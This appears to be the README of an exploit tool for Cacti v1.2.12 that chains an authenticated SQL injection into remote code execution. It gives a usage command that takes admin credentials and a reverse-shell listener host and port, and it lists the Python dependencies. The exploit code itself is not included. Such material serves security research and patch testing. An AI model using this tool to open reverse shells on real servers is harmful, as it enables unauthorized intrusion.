# Cacti v1.2.12 Authenticated Remote Code Execution     
# (SQLI --> RCE)

<h3> Discovery : https://github.com/Cacti/cacti/issues/3622 </h3>


<h4> Usage : </h4>
<h4>python3 cacti_rce.py cacti_rce.py -H http://cactiurl -U `ADMIN USERNAME` -P `ADMIN PASSWORD` -l `LHOST` -p `LPORT` </h4>
  
<br>
usage: cacti_rce.py [-h] [-H H] [-U U] [-P P] [-l L] [-p P]

Cacti v1.2.12 Authenticated Remote Code Execution

 <p> optional arguments: </p>
 <p> -h, --help  show this help message and exit  </p>
 <p> -H H        Cacti URL Eg:http://cactiurl     </p>
 <p> -U U        Cacti Admin Username             </p>
 <p> -P P        Cacti Admin Password             </p>
 <p> -l L        rev shell lhost                  </p>
 <p> -p P        rev shell lport                  </p>


# Dependencies

<h4> pip3 install argparse </h4>
<h4> pip3 install bs4 </h4>
<h4> pip3 install requests </h4>
